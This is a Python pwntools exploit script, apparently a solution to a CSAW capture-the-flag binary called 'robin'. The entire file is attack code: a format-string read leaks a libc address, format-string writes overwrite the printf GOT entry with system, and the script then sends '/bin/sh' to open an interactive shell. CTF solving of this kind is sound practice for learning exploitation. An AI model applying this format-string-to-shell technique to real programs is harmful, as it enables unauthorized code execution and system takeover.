from pwn import *

e = ELF("./robin")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn.chal.csaw.io", 1005)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil(":")

a = "%" + str(5 + 36) + "$lx"
p.sendline(a)
p.recvuntil("Holy ")

leak = int(p.recvuntil(",", drop=True), 16) - 0x7f0cc580b760 + 0x00007f0cc541f000 
print("{:#x}".format(leak))

goal = leak + libc.symbols["system"]
parts = [goal % 0x10000, (goal // 0x10000) % 0x10000]

assert parts[1] > parts[0]

p.sendline(
  ("%" + str(parts[0] - 2).rjust(12, "0") + "x").ljust(0x10)
+ "%12$hn".ljust(8)
+ ("%" + str(parts[1] - parts[0] - 4).rjust(12, "0") + "x").ljust(0x10)
+ "%13$hn".ljust(8)
+ p64(e.got["printf"])
+ p64(e.got["printf"] + 2)
)
p.recvuntil("thinking of")
p.clean()

p.sendline("/bin/sh")

p.interactive()
